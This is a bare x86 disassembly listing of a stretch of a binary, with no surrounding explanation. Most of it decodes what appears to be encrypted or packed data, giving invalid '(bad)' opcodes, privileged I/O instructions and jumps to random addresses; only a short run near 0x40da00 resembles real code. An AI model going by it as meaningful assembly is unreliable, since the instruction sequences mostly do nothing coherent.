  40d6eb:	dec    ebp
  40d6ec:	pop    ecx
  40d6ed:	aam    0x5d
  40d6ef:	cld    
  40d6f0:	or     ebx,DWORD PTR [ebx]
  40d6f2:	test   DWORD PTR [edi+eiz*2],esi
  40d6f5:	or     DWORD PTR [edx-0x24d27639],ecx
  40d6fb:	int    0x59
  40d6fd:	adc    BYTE PTR [esi-0x184bb1cc],cl
  40d703:	mul    DWORD PTR [ecx]
  40d705:	(bad)  
  40d706:	fild   DWORD PTR cs:[ebx]
  40d709:	xchg   BYTE PTR [ecx+0x18],ah
  40d70c:	xchg   esi,eax
  40d70d:	push   es
  40d70e:	sahf   
  40d70f:	mov    DWORD PTR [ebx-0x3d],edx
  40d712:	sahf   
  40d713:	sub    DWORD PTR [ebx+ebx*8-0x772f1ef9],esp
  40d71a:	or     al,0xd8
  40d71c:	shl    bl,0x91
  40d71f:	xlat   BYTE PTR ds:[ebx]
  40d720:	mov    al,0x31
  40d722:	jecxz  0x40d749
  40d724:	jl     0x40d733
  40d726:	sbb    BYTE PTR [edi-0x3f],bl
  40d729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d72a:	mov    dh,0x76
  40d72c:	xor    ebx,DWORD PTR [ebx-0x1b]
  40d72f:	push   ds
  40d730:	(bad)  
  40d731:	cmp    BYTE PTR [ecx],cl
  40d733:	(bad)  
  40d734:	icebp  
  40d735:	(bad)  
  40d736:	sub    eax,0x245e1355
  40d73b:	xchg   esi,eax
  40d73c:	mov    eax,DWORD PTR [ebp+0x56]
  40d73f:	repnz dec bx
  40d742:	pop    ds
  40d743:	stos   DWORD PTR es:[edi],eax
  40d744:	enter  0x3a9e,0x95
  40d748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d749:	std    
  40d74a:	popa   
  40d74b:	adc    al,0x3
  40d74d:	shr    BYTE PTR [edi],1
  40d74f:	cmp    BYTE PTR [ebx+0x4d],cl
  40d752:	mov    esp,0x34ef2350
  40d757:	xchg   esp,eax
  40d758:	or     eax,0xe1232ef5
  40d75d:	jmp    DWORD PTR ds:0x7ade6f
  40d763:	sar    BYTE PTR [ebx],0x55
  40d766:	retf   0x2858
  40d769:	pop    ds
  40d76a:	pop    ecx
  40d76b:	mov    esp,0x9832709c
  40d770:	call   0xe031ed72
  40d775:	pushf  
  40d776:	stos   BYTE PTR es:[edi],al
  40d777:	jp     0x40d706
  40d779:	mov    eax,ds:0x5559e850
  40d77e:	pop    ecx
  40d77f:	movq   mm5,QWORD PTR [ecx]
  40d782:	ret    0xfe2e
  40d785:	int    0xc6
  40d787:	cmp    DWORD PTR [eax+0x4d120b74],ecx
  40d78d:	cmp    BYTE PTR [esi+edx*8+0x28e1dfb9],ah
  40d794:	iret   
  40d795:	dec    ecx
  40d796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d797:	rol    BYTE PTR [ebx+ecx*8+0x3f],1
  40d79b:	dec    esi
  40d79c:	mov    BYTE PTR [edx+0x28],bh
  40d79f:	push   ss
  40d7a0:	sbb    al,0xd4
  40d7a2:	shl    DWORD PTR [esi-0x13],0x7d
  40d7a6:	mov    ch,0xfe
  40d7a8:	adc    DWORD PTR [eax+0x4],esp
  40d7ab:	dec    eax
  40d7ac:	nop
  40d7ad:	test   eax,0x711c659d
  40d7b2:	or     edi,DWORD PTR [esi+ebx*8+0x3e879a3e]
  40d7b9:	arpl   WORD PTR [eax+0x42],ax
  40d7bc:	xchg   edx,eax
  40d7bd:	push   esp
  40d7be:	push   es
  40d7bf:	mov    bl,BYTE PTR [eax+esi*4]
  40d7c2:	clc    
  40d7c3:	(bad)  
  40d7c4:	aas    
  40d7c5:	mov    esi,esp
  40d7c7:	adc    DWORD PTR [ecx-0x416e6baf],eax
  40d7cd:	and    esp,ebx
  40d7cf:	jg     0x40d7d4
  40d7d1:	cld    
  40d7d2:	push   ebp
  40d7d3:	icebp  
  40d7d4:	pop    es
  40d7d5:	inc    esi
  40d7d6:	adc    eax,0xdc51e624
  40d7db:	dec    dl
  40d7dd:	inc    edi
  40d7de:	mov    esi,0xae10bf91
  40d7e3:	cmp    eax,0xb4b24a57
  40d7e8:	fimul  DWORD PTR es:0xc2ade407
  40d7ef:	mov    bh,BYTE PTR [esi]
  40d7f1:	push   ds
  40d7f2:	fwait
  40d7f3:	(bad)  
  40d7f4:	clc    
  40d7f5:	adc    cl,al
  40d7f7:	out    dx,al
  40d7f8:	fst    DWORD PTR [esi+0x64]
  40d7fb:	pushf  
  40d7fc:	es xchg edx,eax
  40d7fe:	ins    DWORD PTR es:[edi],dx
  40d7ff:	or     edi,edx
  40d801:	repz ss hlt 
  40d804:	ins    DWORD PTR es:[edi],dx
  40d805:	pop    ebp
  40d806:	mov    DWORD PTR [edx+edi*2],ebp
  40d809:	cld    
  40d80a:	cmp    BYTE PTR [ebp-0x65c87846],0x7
  40d811:	sub    al,BYTE PTR [ebx-0x523edf8]
  40d817:	mov    esi,0x16129529
  40d81c:	sub    bl,BYTE PTR [edx-0x2d2c0e6e]
  40d822:	cmp    dh,BYTE PTR [edi]
  40d824:	mov    edx,0xb603eee3
  40d829:	xor    bh,ah
  40d82b:	test   BYTE PTR [edi-0x5b1ef407],bl
  40d831:	mov    eax,0x63e111e2
  40d836:	or     eax,0x136eb177
  40d83b:	mov    ah,0x50
  40d83d:	or     edi,ebx
  40d83f:	(bad)  
  40d840:	sub    bh,BYTE PTR [ecx+0x3dedaa20]
  40d846:	fadd   QWORD PTR [eax+eiz*8+0x3844c437]
  40d84d:	mov    ds:0xe5b199bd,al
  40d852:	or     bh,BYTE PTR [eax-0x3e38ae2f]
  40d858:	xor    al,0xd3
  40d85a:	mov    bl,0x10
  40d85c:	jmp    0xef15673b
  40d861:	test   al,0x4a
  40d863:	(bad)  [edx]
  40d865:	clc    
  40d866:	ins    BYTE PTR es:[edi],dx
  40d867:	xor    ecx,DWORD PTR [eax]
  40d869:	or     DWORD PTR [edi+0x31],0xffffffec
  40d86d:	mov    bl,0xb4
  40d86f:	inc    edx
  40d870:	mov    cx,0x3a7a
  40d874:	dec    edx
  40d875:	test   eax,0xa3156256
  40d87a:	xchg   ebp,eax
  40d87b:	(bad)
  40d87e:	outs   dx,DWORD PTR ds:[esi]
  40d87f:	(bad)  
  40d880:	xor    dh,BYTE PTR [esi+0x40]
  40d883:	int    0xcb
  40d885:	cmp    edx,DWORD PTR [edi+ebx*1]
  40d888:	cdq    
  40d889:	jns    0x40d86e
  40d88b:	adc    BYTE PTR [edx-0x37],bl
  40d88e:	(bad)  
  40d88f:	fsub   DWORD PTR [ebx+edi*2]
  40d892:	or     eax,DWORD PTR [esi+0x68]
  40d895:	(bad)  
  40d896:	cmp    al,0x3b
  40d898:	sahf   
  40d899:	inc    ebp
  40d89a:	jmp    0x1670:0xf625d828
  40d8a1:	dec    ebx
  40d8a2:	cmc    
  40d8a3:	mov    ?,WORD PTR [esi]
  40d8a5:	or     eax,0xa223d51f
  40d8aa:	imul   esi,DWORD PTR [edx],0x68b15a36
  40d8b0:	sbb    DWORD PTR [ebx-0x72],0x2c
  40d8b4:	jp     0x40d910
  40d8b6:	mov    ch,0x61
  40d8b8:	push   ecx
  40d8b9:	dec    ecx
  40d8ba:	xor    dh,dh
  40d8bc:	dec    esi
  40d8bd:	lds    edx,FWORD PTR [edi]
  40d8bf:	mov    WORD PTR [ebx+0x2d],?
  40d8c2:	and    esi,DWORD PTR [eiz*4+0x2c59ce1d]
  40d8c9:	xchg   BYTE PTR [esi],ch
  40d8cb:	shr    esp,cl
  40d8cd:	mov    cl,0xde
  40d8cf:	sbb    eax,0x2bf32f09
  40d8d4:	aad    0xc
  40d8d6:	dec    edx
  40d8d7:	hlt    
  40d8d8:	lds    edx,FWORD PTR [ebp-0x7b02cec0]
  40d8de:	bound  eax,QWORD PTR [ecx]
  40d8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8e1:	imul   ebp,DWORD PTR [esi-0x6df81087],0x5b44863
  40d8eb:	mov    ?,WORD PTR [eax]
  40d8ed:	ret    0xec4f
  40d8f0:	mov    eax,0x6ef9a94a
  40d8f5:	sbb    edi,DWORD PTR [edx+0x2f]
  40d8f8:	jmp    DWORD PTR ss:[esi]
  40d8fb:	dec    ecx
  40d8fc:	leave  
  40d8fd:	cli    
  40d8fe:	mov    ecx,0xece1aaf3
  40d903:	mov    eax,0xb499159f
  40d908:	int3   
  40d909:	inc    esp
  40d90a:	pop    ss
  40d90b:	and    eax,0xc04a0965
  40d910:	add    ebx,DWORD PTR [edi-0x4e7cad9d]
  40d916:	jl     0x40d8db
  40d918:	test   eax,0xcec90434
  40d91d:	(bad)  
  40d91e:	cld    
  40d91f:	or     eax,0xfecd79eb
  40d924:	add    al,0xdd
  40d926:	mov    eax,ds:0x5ebc25bd
  40d92b:	fimul  DWORD PTR [ebx+eiz*4]
  40d92e:	iret   
  40d92f:	ja     0x40d8f4
  40d931:	pop    edi
  40d932:	inc    esp
  40d933:	(bad)  
  40d934:	vmulps xmm6,xmm1,xmm7
  40d938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d939:	mov    ebx,0xade2e0bf
  40d93e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d93f:	mov    ds,WORD PTR [eax+0x44507773]
  40d945:	aaa    
  40d946:	jb     0x40d955
  40d948:	or     cl,dl
  40d94a:	out    0x12,eax
  40d94c:	fimul  WORD PTR [esi+edx*8+0x758f04c9]
  40d953:	mov    ebp,0x706ce449
  40d958:	dec    esp
  40d959:	dec    ebx
  40d95a:	jle    0x40d927
  40d95c:	sub    al,0x97
  40d95e:	sub    esp,DWORD PTR [ebx-0xb]
  40d961:	xchg   esp,eax
  40d962:	jne    0x40d948
  40d964:	dec    ecx
  40d965:	mov    edi,0x5b983cb7
  40d96a:	push   cs
  40d96b:	adc    BYTE PTR [ebx-0x3b],dh
  40d96e:	mov    bl,0x18
  40d970:	adc    eax,0xdc1af177
  40d975:	adc    eax,0x67ca0ddd
  40d97a:	into   
  40d97b:	div    BYTE PTR [edi+0x40]
  40d97e:	in     eax,dx
  40d97f:	push   esp
  40d980:	out    dx,eax
  40d981:	dec    esp
  40d982:	lahf   
  40d983:	push   cs
  40d984:	sbb    edx,eax
  40d986:	and    eax,0x9714b4bd
  40d98b:	xor    al,0xf
  40d98d:	jge    0x40d9e9
  40d98f:	(bad)  
  40d990:	inc    ebx
  40d991:	adc    al,0x38
  40d993:	lods   al,BYTE PTR ds:[esi]
  40d994:	fmul   QWORD PTR [eax-0x31]
  40d997:	jne    0x40d9c0
  40d999:	inc    ebp
  40d99a:	test   eax,0x8d8d2265
  40d99f:	mov    ebp,0x9f2e972d
  40d9a4:	imul   ebx,ecx,0xffffff9f
  40d9a7:	add    al,0x68
  40d9a9:	xlat   BYTE PTR ds:[ebx]
  40d9aa:	sbb    bh,bh
  40d9ac:	test   DWORD PTR [edx+ebx*4],edx
  40d9af:	inc    ebp
  40d9b0:	jecxz  0x40d93c
  40d9b2:	lock dec esi
  40d9b4:	aam    0x39
  40d9b6:	aam    0xe9
  40d9b8:	sbb    ah,bh
  40d9ba:	adc    eax,0x6e3b5b8a
  40d9bf:	cmp    BYTE PTR [ebx-0x7a83bef1],bh
  40d9c5:	rol    BYTE PTR [eax-0x78],1
  40d9c8:	pop    ebx
  40d9c9:	sti    
  40d9ca:	mov    dl,0xe0
  40d9cc:	out    dx,eax
  40d9cd:	adc    edi,edi
  40d9cf:	add    al,cl
  40d9d1:	sub    al,0xe1
  40d9d3:	xchg   ebx,eax
  40d9d4:	push   edx
  40d9d5:	sub    DWORD PTR [edx-0x7617f9a5],ebx
  40d9db:	mov    BYTE PTR [ebp-0x4976b54b],cl
  40d9e1:	aas    
  40d9e2:	mov    ch,0xa1
  40d9e4:	cdq    
  40d9e5:	mov    dh,0x45
  40d9e7:	mov    ch,0x14
  40d9e9:	repnz sbb BYTE PTR [ecx-0x5e4458a],bl
  40d9f0:	shl    BYTE PTR [esi+ebp*1-0x3fe3ac6d],cl
  40d9f7:	dec    edx
  40d9f8:	sbb    DWORD PTR [ecx+ecx*4-0x3fccebb3],edx
  40d9ff:	or     DWORD PTR [ebp+0x14],eax
  40da02:	mov    eax,DWORD PTR [ebp-0x50]
  40da05:	mov    ecx,DWORD PTR [ebp-0x4c]
  40da08:	shrd   eax,ecx,0x2
  40da0c:	shr    ecx,0x2
  40da0f:	mov    cx,ax
  40da12:	mov    eax,DWORD PTR [ebp-0x50]
  40da15:	mov    edx,0x655c
  40da1a:	xor    cx,dx
  40da1d:	jmp    0x40dfa7
  40da22:	sbb    DWORD PTR [edx+ebx*1+0x623918bf],0x20
  40da2a:	das    
  40da2b:	je     0x68cacfe3
  40da31:	jb     0x40da30
  40da33:	stos   BYTE PTR es:[edi],al
  40da34:	push   ss
  40da35:	push   ss
  40da36:	cmp    eax,0xba161604
  40da3b:	pop    ss
  40da3c:	mov    al,ds:0x6dbc5ee6
  40da41:	popf   
  40da42:	loopne 0x40d9d0
  40da44:	push   edi
  40da45:	out    dx,eax
  40da46:	mov    DWORD PTR [edx+0x18],eax
  40da49:	bound  esi,QWORD PTR [esi-0x2d9a12f4]
  40da4f:	pop    ecx
  40da50:	cs scas al,BYTE PTR es:[edi]
  40da52:	pop    ds
  40da53:	sbb    al,BYTE PTR [esi+0x6b2878d5]
  40da59:	aam    0xd8
  40da5b:	xchg   esi,eax
  40da5c:	mov    ebx,0x71c16bd8
  40da61:	ins    BYTE PTR es:[edi],dx
  40da62:	int3   
  40da63:	mov    ds:0x32be159b,al
  40da68:	adc    bl,bh
  40da6a:	and    esp,DWORD PTR es:[eax+0xa]
  40da6e:	add    BYTE PTR [ebp-0x5b2e6fee],ah
  40da74:	dec    esp
  40da75:	int    0x9e
  40da77:	xchg   ecx,eax
  40da78:	call   0x8ddca41a
  40da7d:	pop    es
  40da7e:	xlat   BYTE PTR ds:[ebx]
  40da7f:	push   cs
  40da80:	in     eax,0xe6
  40da82:	push   esp
  40da83:	push   0xa624acb1
  40da88:	jp     0x40da0e
  40da8a:	sar    DWORD PTR [edx],1
  40da8c:	or     eax,0xa038986
  40da91:	outs   dx,BYTE PTR ds:[esi]
  40da92:	jmp    0x40da6e
  40da94:	jno    0x40da84
  40da96:	retf   
  40da97:	pushf  
  40da98:	aas    
  40da99:	mov    bl,0xfa
  40da9b:	loopne 0x40db12
  40da9d:	jne    0x40db1d
  40da9f:	in     eax,dx
  40daa0:	aaa    
  40daa1:	sahf   
  40daa2:	aaa    
  40daa3:	xchg   edi,eax
  40daa4:	add    eax,0x987c6ff7
  40daa9:	jnp    0x40dac3
  40daab:	icebp  
  40daac:	jns    0x40da73
  40daae:	cmp    al,0x85
  40dab0:	jns    0x40da4e
  40dab2:	lods   al,BYTE PTR ds:[esi]
  40dab3:	jmp    0x40dac4
  40dab5:	scas   al,BYTE PTR es:[edi]
  40dab6:	push   0x83232e65
  40dabb:	repz mov edi,0x4a0a2b20
  40dac1:	fsubr  QWORD PTR [edi+0x35]
  40dac4:	dec    esi
  40dac5:	sub    ecx,DWORD PTR [edi+0x32048d95]
  40dacb:	lods   al,BYTE PTR ds:[esi]
  40dacc:	inc    edx
  40dacd:	push   ds
  40dace:	jb     0x40dafd
  40dad0:	addps  xmm5,xmm0
  40dad3:	hlt    
  40dad4:	adc    dh,bh
  40dad6:	and    esp,DWORD PTR [edx+0x2c57f445]
  40dadc:	sbb    ch,BYTE PTR [ecx-0x4c]
  40dadf:	not    ah
  40dae1:	stc    
  40dae2:	daa    
  40dae3:	fisttp DWORD PTR [edx]
  40dae5:	inc    esp
  40dae6:	int    0xdb
  40dae8:	mov    esi,0x8c406d39
  40daed:	sbb    al,0x9c
  40daef:	aam    0x2b
  40daf1:	pop    ecx
  40daf2:	and    BYTE PTR [edi+0x63],0x4a
  40daf6:	ss shr ebx,1
  40daf9:	push   esi
  40dafa:	dec    ecx
  40dafb:	mov    esp,DWORD PTR [ecx]
  40dafd:	or     al,0xc7
  40daff:	aam    0x62
  40db01:	imul   eax,DWORD PTR [eax],0x82980744
  40db07:	pop    eax
  40db08:	and    ah,al
  40db0a:	gs test eax,0x80109464
  40db10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db11:	loopne 0x40db54
  40db13:	(bad)  
  40db14:	xor    eax,0xd5a0dcc6
  40db19:	es and dh,ah
  40db1c:	sahf   
  40db1d:	inc    esi
  40db1e:	(bad)  
  40db1f:	sti    
  40db20:	or     al,0x20
  40db22:	add    al,0x61
  40db24:	mov    ch,0x85
  40db26:	adc    DWORD PTR [ecx+ebp*8],edx
  40db29:	push   esi
  40db2a:	push   cs
  40db2b:	mov    ecx,0x97cbb8ee
  40db30:	call   0xe061e041
  40db35:	call   0x5da9965
  40db3a:	adc    eax,0x1d8b8c9f
  40db3f:	dec    ebx
  40db40:	mov    BYTE PTR [ebx+esi*4+0x3e3de18c],ah
  40db47:	shl    DWORD PTR ds:0xd3f6e5a1,1
  40db4d:	enter  0xfb1,0xaf
  40db51:	xor    al,BYTE PTR [ebx+0x54]
  40db54:	adc    DWORD PTR [edx-0x3d],edx
  40db57:	mov    BYTE PTR [edx],ch
  40db59:	lods   eax,DWORD PTR ds:[esi]
  40db5a:	push   ebx
  40db5b:	mov    DWORD PTR [esp+edx*4-0x44326d49],ebp
  40db62:	in     eax,dx
  40db63:	or     al,0xcc
  40db65:	daa    
  40db66:	mov    ecx,0x723e39d2
  40db6b:	pusha  
  40db6c:	in     eax,0xfd
  40db6e:	sbb    DWORD PTR [ebx+0x30],0x1b
  40db72:	cs jo  0x40db36
  40db75:	icebp  
  40db76:	add    BYTE PTR [ebx],bl
  40db78:	xchg   BYTE PTR [ebx],dh
  40db7a:	test   DWORD PTR [esi],esp
  40db7c:	add    eax,0xc04b956f
  40db81:	clc    
  40db82:	shl    DWORD PTR [edx+0x1],cl
  40db85:	or     al,bl
  40db87:	hlt    
  40db88:	sub    dh,bh
  40db8a:	and    al,0xf2
  40db8c:	sub    al,0xbc
  40db8e:	sbb    cl,cl
  40db90:	and    eax,DWORD PTR [esi+0x4d8e78e5]
  40db96:	dec    edx
  40db97:	dec    esp
  40db98:	leave  
  40db99:	mov    eax,ds:0x3a1de913
  40db9e:	jno    0x40db90
  40dba0:	xor    DWORD PTR [ebx+0x6546e15b],ebp
  40dba6:	push   esp
  40dba7:	push   es
  40dba8:	mov    ds:0xb7c63598,al
  40dbad:	outs   dx,DWORD PTR ds:[esi]
  40dbae:	mov    eax,0x906ecc51
  40dbb3:	int    0xcf
  40dbb5:	mov    DWORD PTR [eax+0x4d],eax
  40dbb8:	rcr    BYTE PTR [ebx+0x78ee642d],cl
  40dbbe:	xor    al,cl
  40dbc0:	jbe    0x40db60
  40dbc2:	inc    edi
  40dbc3:	sbb    esp,edi
  40dbc5:	xchg   BYTE PTR [edi+0x65],bl
  40dbc8:	shl    bl,1
  40dbca:	mov    ch,0x56
  40dbcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbcd:	test   al,0x3f
  40dbcf:	xchg   DWORD PTR [edx+0x70],edx
  40dbd2:	jno    0x40db5a
  40dbd4:	mov    BYTE PTR [edi],dl
  40dbd6:	imul   esi,eax,0x7d1b2896
  40dbdc:	(bad)  
  40dbdd:	in     al,dx
  40dbde:	cmp    edx,DWORD PTR [edi]
  40dbe0:	jmp    0x32e757b4
  40dbe5:	aaa    
  40dbe6:	mov    ch,0x8e
  40dbe8:	mov    esp,es
  40dbea:	pop    es
  40dbeb:	sbb    DWORD PTR [ebx+ebx*2-0x2dc94cf],edx
  40dbf2:	inc    ecx
  40dbf3:	cli    
  40dbf4:	mov    esp,0x710bf29a
  40dbf9:	es loop 0x40dc4b
  40dbfc:	adc    DWORD PTR [ebx-0x6cfc7b9a],eax
  40dc02:	or     ebx,eax
  40dc04:	call   0x1f81:0x957c1d69
  40dc0b:	les    esp,FWORD PTR [ecx-0x48262685]
  40dc11:	sub    al,0x9
  40dc13:	into   
  40dc14:	pop    edi
  40dc15:	test   al,0x1f
  40dc17:	dec    ecx
  40dc18:	push   eax
  40dc19:	mov    dl,0x73
  40dc1b:	lds    edx,FWORD PTR [eax]
  40dc1d:	out    0xcb,al
  40dc1f:	cmp    DWORD PTR [esi],ebx
  40dc21:	jne    0x40dc79
  40dc23:	vandnps ymm4,ymm5,YMMWORD PTR ds:0x645e09bb
  40dc2b:	cmp    ch,al
  40dc2d:	pusha  
  40dc2e:	adc    BYTE PTR [ebx],cl
  40dc30:	add    bh,BYTE PTR [edx+ebx*2-0xcf42a32]
  40dc37:	pusha  
  40dc38:	mov    eax,DWORD PTR [eax-0x1eab0d8e]
  40dc3e:	xor    eax,0xfa5b007a
  40dc43:	test   eax,0x3f06b7b2
  40dc48:	pop    es
  40dc49:	(bad)  
  40dc4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc4b:	sahf   
  40dc4c:	mov    bh,0xb1
  40dc4e:	dec    ebp
  40dc4f:	mov    esp,0xe6673917
  40dc54:	adc    eax,0x2f92acf7
  40dc59:	and    BYTE PTR [esi],0x1e
  40dc5c:	loopne 0x40dcab
  40dc5e:	and    ebx,DWORD PTR [edx]
  40dc60:	sub    esp,DWORD PTR [eax+0x2c77f8aa]
  40dc66:	adc    DWORD PTR [ebp+0x111cbb35],ebx
  40dc6c:	dec    ecx
  40dc6d:	inc    eax
  40dc6e:	xchg   esi,eax
  40dc6f:	jl     0x40dcc2
  40dc71:	or     eax,0x2f91ffa8
  40dc76:	lock (bad) 
  40dc78:	sub    eax,0xfc96fbbc
  40dc7d:	fidivr WORD PTR [eax]
  40dc7f:	shl    ah,0x89
  40dc82:	retf   
  40dc83:	popfw  
  40dc85:	jge    0x40dd04
  40dc87:	(bad)  
  40dc88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc89:	sub    BYTE PTR [ebx],0xa3
  40dc8c:	cmp    al,BYTE PTR [edi+esi*4+0x58]
  40dc90:	(bad)  
  40dc91:	mov    cl,0x40
  40dc93:	jmp    0x20a2:0xfc3df624
  40dc9a:	popa   
  40dc9b:	(bad)  
  40dc9c:	in     al,dx
  40dc9d:	or     al,BYTE PTR [edi+ecx*8+0x74f85a8c]
  40dca4:	inc    ecx
  40dca5:	shl    DWORD PTR [edx+eax*2+0x7],1
  40dca9:	in     eax,0x39
  40dcab:	jge    0x40dd18
  40dcad:	fld    DWORD PTR [esi]
  40dcaf:	pop    esp
  40dcb0:	cmp    dl,BYTE PTR [edi-0x3b]
  40dcb3:	inc    eax
  40dcb4:	rcl    BYTE PTR [edx+0x64ea80f9],0xf4
  40dcbb:	retf   0xb3e1
  40dcbe:	sbb    bh,BYTE PTR [ecx]
  40dcc0:	daa    
  40dcc1:	jge    0x40dca0
  40dcc3:	fstp   DWORD PTR [edx]
  40dcc5:	fnstsw WORD PTR ds:0x33c2d864
  40dccb:	in     eax,0x58
  40dccd:	mov    eax,ds:0xbd383e95
  40dcd2:	jmp    0xb5b948e1
  40dcd7:	in     al,dx
  40dcd8:	add    BYTE PTR [edi+0x37],bl
  40dcdb:	jmp    0x67b23a98
  40dce0:	nop
  40dce1:	mov    ds:0xa14e3450,al
  40dce6:	cmp    cl,BYTE PTR [ecx-0x68f8f682]
  40dcec:	mov    ecx,0xc28d54d8
  40dcf1:	inc    edx
  40dcf2:	or     eax,0xabc8407b
  40dcf7:	repz cmp al,0x3d
  40dcfa:	pusha  
  40dcfb:	adc    eax,0xd75a77bf
  40dd00:	mov    ch,ch
  40dd02:	and    al,0x24
  40dd04:	cmp    al,0x91
  40dd06:	sti    
  40dd07:	imul   esp,DWORD PTR [ecx],0x14
  40dd0a:	or     ch,BYTE PTR [ecx]
  40dd0c:	mov    ds:0xf6fd311a,eax
  40dd11:	rcr    DWORD PTR [esi-0x35f1e233],0x8e
  40dd18:	sbb    DWORD PTR [ebx-0x3a561ed8],0xe93c6259
  40dd22:	ret    0x7e5a
  40dd25:	in     al,0xc1
  40dd27:	(bad)  
  40dd28:	call   0xb71b:0x61e0e289
  40dd2f:	out    0xc5,al
  40dd31:	mov    esi,DWORD PTR es:[ebx+edx*4]
  40dd35:	mov    edx,0x79332e81
  40dd3a:	or     bh,ch
  40dd3c:	jne    0x40dd14
  40dd3e:	not    BYTE PTR [edi*8+0x327705a2]
  40dd45:	in     al,dx
  40dd46:	sbb    al,0x10
  40dd48:	mov    esi,0xcf166819
  40dd4d:	push   0x330d7704
  40dd52:	rcr    BYTE PTR [edx-0x1c094ca5],0x64
  40dd59:	sbb    edi,DWORD PTR [eax]
  40dd5b:	out    0x1a,eax
  40dd5d:	iret   
  40dd5e:	int    0xe
  40dd60:	test   al,0xcc
  40dd62:	and    al,0xbe
  40dd64:	aaa    
  40dd65:	leave  
  40dd66:	lock xor bh,BYTE PTR [edx+ebx*1-0x2b327ac7]
  40dd6e:	loop   0x40dd19
  40dd70:	leave  
  40dd71:	scas   eax,DWORD PTR es:[edi]
  40dd72:	add    eax,0x44d1f8bd
  40dd77:	cmp    BYTE PTR [ebp-0x48d823e2],bl
  40dd7d:	das    
  40dd7e:	inc    ecx
  40dd7f:	xchg   ebx,eax
  40dd80:	sub    al,0x95
  40dd82:	inc    ebp
  40dd83:	push   eax
  40dd84:	push   esp
  40dd85:	mov    ecx,0x72552ce3
  40dd8a:	push   ecx
  40dd8b:	mov    WORD PTR [ecx],?
  40dd8d:	pop    esp
  40dd8e:	shl    DWORD PTR [eax+0x6e854692],1
  40dd94:	mov    eax,?
  40dd96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd97:	les    eax,FWORD PTR [eax+0x2]
  40dd9a:	mov    dh,0x42
  40dd9c:	retf   
  40dd9d:	(bad)  
  40dd9e:	fbstp  TBYTE PTR [esi]
  40dda0:	adc    al,0x59
  40dda2:	aam    0x1c
  40dda4:	inc    edi
  40dda5:	sbb    edx,esi
  40dda7:	and    ah,cl
  40dda9:	cmp    ebx,DWORD PTR [esi-0x19f04fb9]
  40ddaf:	mov    esp,0x8be5e17a
  40ddb4:	mov    al,0x24
  40ddb6:	(bad)  
  40ddb7:	jae    0x40ddc0
  40ddb9:	popf   
  40ddba:	mov    DWORD PTR [esi-0x358c1c14],edx
  40ddc0:	dec    esi
  40ddc1:	data16 mov ds,WORD PTR [ebp-0x75]
  40ddc5:	xchg   esp,eax
  40ddc6:	xor    BYTE PTR [eax],ch
  40ddc8:	dec    edx
  40ddc9:	xchg   ebx,eax
  40ddca:	mov    eax,ds:0x3f3cef0b
  40ddcf:	les    ecx,FWORD PTR [esi+esi*2+0x248b7191]
  40ddd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd7:	out    0x47,al
  40ddd9:	jbe    0x40de3f
  40dddb:	sbb    ah,dh
  40dddd:	xor    DWORD PTR [edx+edx*8-0x7ffe458a],esp
  40dde4:	xor    edi,DWORD PTR [edx-0x59e5d124]
  40ddea:	cs das 
  40ddec:	xlat   BYTE PTR ds:[ebx]
  40dded:	or     al,0xc7
  40ddef:	adc    DWORD PTR [edi-0x57],ebx
  40ddf2:	mov    bl,0x74
  40ddf4:	xchg   ecx,eax
  40ddf5:	ins    BYTE PTR es:[edi],dx
  40ddf6:	sti    
  40ddf7:	ins    DWORD PTR es:[edi],dx
  40ddf8:	xchg   esi,eax
  40ddf9:	mov    esp,0x90e9399b
  40ddfe:	sar    BYTE PTR [esi],cl
  40de00:	mov    al,0xec
  40de02:	in     eax,0x37
  40de04:	mov    cs,esp
  40de06:	fwait
  40de07:	dec    eax
  40de08:	out    0x7b,eax
  40de0a:	push   ecx
  40de0b:	test   BYTE PTR [ecx*8-0x52875993],0x2e
  40de13:	xchg   esp,eax
  40de14:	bound  edi,QWORD PTR cs:[eax+0x7b]
  40de18:	lahf   
  40de19:	inc    esp
  40de1a:	adc    DWORD PTR [ecx-0x22],0x98f5f367
  40de21:	and    ebp,DWORD PTR [ecx+edx*2]
  40de24:	mov    eax,0xf63eab5c
  40de29:	in     al,0x2f
  40de2b:	adc    ebx,DWORD PTR [esi-0x41edb35f]
  40de31:	fadd   QWORD PTR [ebx]
  40de33:	data16 adc BYTE PTR [esi-0x226c2d19],dh
  40de3a:	mov    eax,0x353976fb
  40de3f:	cmp    DWORD PTR [esi-0x50],0xfffffff6
  40de43:	ja     0x40de07
  40de45:	pop    edi
  40de46:	aam    0xc8
  40de48:	adc    dh,al
  40de4a:	iret   
  40de4b:	or     eax,0xc40086ce
  40de50:	push   ss
  40de51:	sub    esi,ebp
  40de53:	cmp    BYTE PTR [esi-0x72943f98],0xe7
  40de5a:	das    
  40de5b:	call   0xaa0354fb
  40de60:	addr16 mov cl,0xde
  40de63:	sub    BYTE PTR [edx],0xd3
  40de66:	aad    0xd
  40de68:	sbb    dl,BYTE PTR [ecx+0x36c8658e]
  40de6e:	push   0xfffffffb
  40de70:	outs   dx,BYTE PTR ds:[esi]
  40de71:	inc    edi
  40de72:	mov    bh,0xba
  40de74:	mov    dl,0x4f
  40de76:	call   0x9c76:0x6dcc37fe
  40de7d:	ja     0x40deac
  40de7f:	repz sub dh,bh
  40de82:	fisttp DWORD PTR [edi]
  40de84:	fwait
  40de85:	mov    WORD PTR [ecx],cs
  40de87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de88:	aas    
  40de89:	xchg   esi,eax
  40de8a:	jno    0x40de63
  40de8c:	div    DWORD PTR [ecx-0x1e]
  40de8f:	(bad)  
  40de90:	rol    BYTE PTR [ebx],1
  40de92:	dec    ebp
  40de93:	(bad)  
  40de94:	outs   dx,BYTE PTR ds:[esi]
  40de95:	push   ecx
